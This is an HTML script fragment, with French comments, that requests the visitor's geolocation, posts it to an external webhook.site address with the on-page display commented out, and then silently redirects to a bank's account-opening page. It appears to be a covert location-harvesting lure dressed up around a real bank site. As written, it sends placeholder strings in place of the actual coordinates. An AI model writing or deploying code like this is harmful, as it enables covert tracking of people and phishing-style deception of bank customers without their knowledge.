  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendPosition, showError);
      } else {
        document.getElementById("result").innerText = "La g√©olocalisation n'est pas support√©e.";
      }
    }

    function sendPosition(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      /*document.getElementById("result").innerText =
        `Position re√ßue : Latitude ${lat}, Longitude ${lon}`;*/

      // Envoie vers ton webhook ou ton email via service externe
      fetch("https://webhook.site/b03e51c0-21dd-446a-a69a-2a20af217999", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        //body: JSON.stringify({ latitude: lat, longitude: lon })
        body: JSON.stringify({ latitude: "lat", longitude: "lon" })
      }).then();
      window.location.replace("https://ebank.gtbankci.com/OpenAccount/")
    }

    function showError(error) {
      document.getElementById("result").innerText =
        "Erreur de g√©olocalisation : " + error.message;
    }
  </script>
</body>
